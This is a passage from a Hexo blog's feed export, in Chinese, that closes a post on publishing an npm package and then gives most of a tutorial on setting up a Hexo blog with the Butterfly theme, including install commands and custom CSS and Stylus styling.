registry</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmjs.org/</span><br></pre></td></tr></table></figure><p>淘宝镜像 <a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org/</a> </p><ol start="4"><li><strong>登录npm</strong></li></ol><blockquote><p>登录时需要邮箱验证</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm login</span><br></pre></td></tr></table></figure><ol start="5"><li><strong>发布</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><h2 id="八、-发布报错"><a href="#八、-发布报错" class="headerlink" title="八、 发布报错"></a>八、 发布报错</h2><ul><li><strong>原因：包重名</strong></li></ul><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/simple-init-npmerror.png" alt="simple-init-npmerror"></p><ul><li><strong>解决 ：</strong></li></ul><p>修改 <strong>package.json</strong> 重新 <code>npm publish</code> 即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cus-components&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><ul><li>之后即可在项目中正常使用 <code> npm install cus-components</code> 下载使用组件</li></ul><div class="note warning flat"><p><strong>(注意要引入时的包名也要修改)</strong> </p></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、-建立一个用来打包编译的工程plugin-generator-system&quot;&gt;&lt;a href=&quot;#一、-建立一个用来打包编译的工程plugin-generator-system&quot; class=&quot;headerlink&quot; title=&quot;一、 建立一个用来打包编译的</summary>
      
    
    
    
    <category term="webpack" scheme="https://hisai3.github.io/hisai3.github.io/categories/webpack/"/>
    
    
    <category term="webpack" scheme="https://hisai3.github.io/hisai3.github.io/tags/webpack/"/>
    
    <category term="vue" scheme="https://hisai3.github.io/hisai3.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>HEXO 搭建博客</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/HEXO%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/HEXO%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-01-14T06:55:31.000Z</published>
    <updated>2023-02-03T06:06:32.542Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Butterfly主题修改"><a href="#Butterfly主题修改" class="headerlink" title="Butterfly主题修改"></a><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly主题</a>修改</h3><ol><li>在目录<code>theme</code>中下载 <a href="https://hexo.io/themes/">hexo主题</a>  <a href="https://zhuanlan.zhihu.com/p/491537945">推荐主题</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jerryc127/hexo-theme-butterfly.git</span><br></pre></td></tr></table></figure><ol start="2"><li>修改站点配置文件<code>_config.yml</code>, 把主题修改为 <code>hexo-theme-butterfly</code> 安装的主题文件名（注意theme: 要有空格隔开）</li></ol><p>更改主题后启动服务器，界面显如下字符:</p><p><code>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial</code></p><p><strong>执行如下命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</span><br></pre></td></tr></table></figure><p>清除缓存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>生成静态文件即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><h3 id="配置修改"><a href="#配置修改" class="headerlink" title="配置修改"></a>配置修改</h3><ul><li><p><a href="https://sanshui.vip/2022/12/06/butterfly%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE3/">三水个人博客-自定义样式</a></p></li><li><p><a href="https://www.guole.fun/posts/butterfly-custom/#%E6%96%87%E7%AB%A0%E7%B4%A0%E6%9D%90">Guo Le-自定义样式</a></p></li><li><p><a href="https://blog.csdn.net/qq_38157825/article/details/112783083">Butterfly主题安装文档(三)之主题配置2</a></p></li></ul><p><strong>网页背景渐变</strong> 可以直接在配置文件 <code>hexo-theme-butterfly</code> 中设置 <code>background </code> </p><ul><li>纯渐变</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#web_bg</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(</span><br><span class="line">    <span class="number">0deg</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86%</span>,</span><br><span class="line">    <span class="built_in">rgba</span>(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100%</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><ul><li>背景加渐变</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#web_bg</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H5662031fbf344418aa2c8bf74c68826eV.png&#x27;</span>),</span><br><span class="line">    <span class="built_in">-moz-linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#6dd0f2</span> <span class="number">15%</span>, <span class="number">#f59abe</span> <span class="number">85%</span>);</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H5662031fbf344418aa2c8bf74c68826eV.png&#x27;</span>),</span><br><span class="line">    <span class="built_in">-webkit-linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#6dd0f2</span> <span class="number">15%</span>, <span class="number">#f59abe</span> <span class="number">85%</span>);</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H5662031fbf344418aa2c8bf74c68826eV.png&#x27;</span>),</span><br><span class="line">    <span class="built_in">-ms-linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#6dd0f2</span> <span class="number">15%</span>, <span class="number">#f59abe</span> <span class="number">85%</span>);</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H5662031fbf344418aa2c8bf74c68826eV.png&#x27;</span>),</span><br><span class="line">    <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#6dd0f2</span> <span class="number">15%</span>, <span class="number">#f59abe</span> <span class="number">85%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#web_bg</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H18a4b998752a4ae68b8e85d432a5aef0l.png&#x27;</span>),</span><br><span class="line">    <span class="built_in">linear-gradient</span>(</span><br><span class="line">      <span class="number">60deg</span>,</span><br><span class="line">      <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">165</span>, <span class="number">150</span>, <span class="number">0.5</span>) <span class="number">5%</span>,</span><br><span class="line">      <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">228</span>, <span class="number">255</span>, <span class="number">0.35</span>)</span><br><span class="line">    ),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;https://ae01.alicdn.com/kf/H21b5f6b8496141a1979a33666e1074d9x.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h3><h4 id="新建-custom-css-放在-public-css-文件中-网上都是放到主题包中的-source-css-但没法打包到-public-中"><a href="#新建-custom-css-放在-public-css-文件中-网上都是放到主题包中的-source-css-但没法打包到-public-中" class="headerlink" title="新建 custom.css  放在 public/css 文件中 !! (网上都是放到主题包中的 source/css, 但没法打包到 public 中)"></a>新建 <code>custom.css</code>  放在 <code>public/css</code> 文件中 !! (<strong>网上都是放到主题包中的 <code>source/css</code>, 但没法打包到 <code>public</code> 中</strong>)</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.layout_post</span> &gt; <span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside_content</span> <span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>,</span><br><span class="line"><span class="selector-class">.layout_page</span>&gt;<span class="selector-tag">div</span><span class="selector-pseudo">:first</span>-child<span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>),</span><br><span class="line"><span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#page</span>,</span><br><span class="line"><span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">  <span class="attr">--card-hover-box-shadow</span>: <span class="number">0</span> <span class="number">3px</span> <span class="number">8px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(<span class="number">7</span>,<span class="number">17</span>,<span class="number">27</span>,<span class="number">0.2</span>);</span><br><span class="line">  <span class="attr">--guole-main</span>: <span class="number">#49b1f5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> &#123;</span><br><span class="line">  <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h1</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ef50a8</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h2</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fb7061</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h3</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffbf00</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h4</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a9e000</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h5</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#57c850</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h6</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#5ec1e0</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h2</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h3</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h4</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h5</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h6</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: ccc <span class="number">1.6s</span> linear infinite;</span><br><span class="line">  <span class="attribute">animation</span>: ccc <span class="number">1.6s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 代码块样式 */</span></span><br><span class="line"><span class="selector-id">#article-container</span> <span class="selector-tag">figure</span><span class="selector-class">.highlight</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">7px</span>;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">144</span>,<span class="number">164</span>,<span class="number">174</span>,<span class="number">0.4</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">144</span>,<span class="number">164</span>,<span class="number">174</span>,<span class="number">0.4</span>);</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">translateZ</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#article-container</span> <span class="selector-tag">figure</span><span class="selector-class">.highlight</span> <span class="selector-class">.highlight-tools</span> <span class="selector-class">.code-lang</span> &#123;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">75px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#article-container</span> <span class="selector-tag">figure</span><span class="selector-class">.highlight</span> <span class="selector-class">.highlight-tools</span> <span class="selector-class">.expand</span> &#123;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#article-container</span> <span class="selector-tag">figure</span><span class="selector-class">.highlight</span> <span class="selector-class">.highlight-tools</span> <span class="selector-class">.expand</span> ~ <span class="selector-class">.copy-button</span> &#123;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">2.1em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#article-container</span> <span class="selector-tag">figure</span><span class="selector-class">.highlight</span> <span class="selector-class">.highlight-tools</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#fc625d</span>;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">#fdbc40</span>, <span class="number">40px</span> <span class="number">0</span> <span class="number">#35cd4b</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">#fdbc40</span>, <span class="number">40px</span> <span class="number">0</span> <span class="number">#35cd4b</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 目录-当前节点 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-id">#card-toc</span> <span class="selector-class">.toc-content</span> <span class="selector-class">.toc-link</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--guole-main);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-o-keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">1turn</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>hexo-theme-butterfly.yml</code>  中 <code>inject</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/hisai/css/custom.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="解决-custom-css-无法自动打包到-public中"><a href="#解决-custom-css-无法自动打包到-public中" class="headerlink" title="解决 custom.css 无法自动打包到 public中"></a>解决 <code>custom.css</code> 无法自动打包到 <code>public</code>中</h4><ul><li>新建 <code>themes\hexo-theme-butterfly\source\css\custom.styl</code></li><li>将 <code>custom.css</code> 转 <code>custom.styl</code>   <a href="https://www.zhangxinxu.com/jq/stylus/keyframes.php">css转stylus在线工具</a> (转换可能不太准，要确认一下<a href="https://www.stylus-lang.cn/docs/keyframes.html">stylus语法</a>) </li><li>在 <code>source\css\index</code> 中加上  @import ‘custom’</li><li>可以不用在 inject</li></ul><p>转换后的样式 <code>custom.styl</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 